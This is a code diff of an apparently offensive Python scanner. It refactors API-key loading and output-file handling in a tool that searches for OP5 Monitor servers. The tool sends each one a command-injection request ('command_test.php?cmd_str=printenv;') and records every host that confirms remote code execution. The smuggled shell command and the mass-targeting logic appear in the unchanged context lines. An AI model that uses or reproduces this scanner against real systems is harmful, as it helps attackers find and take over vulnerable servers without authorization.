@@ -14,7 +14,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOURAPIKEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = 'title:"op5"'
 FILE = "/monitor/op5/nacoma/command_test.php?cmd_str=printenv;"
 session = requests.Session()
@@ -36,7 +42,7 @@ def grab_file (IP,PORT,FILE):
 		result = response.text
 		if response.status_code == 200:
 			if 'Plugin return code' in result:
-				text_file = open("./cfg/op5.cfg", "a")
+				text_file = open_output("cfg/op5.cfg", "a")
 				text_file.write("https://"+IP+":"+PORT+"/monitor/op5/nacoma/command_test.php?cmd_str=printenv\n")
 				text_file.close()
 				print ("[*] OP5 RCE... Found [*]\n")
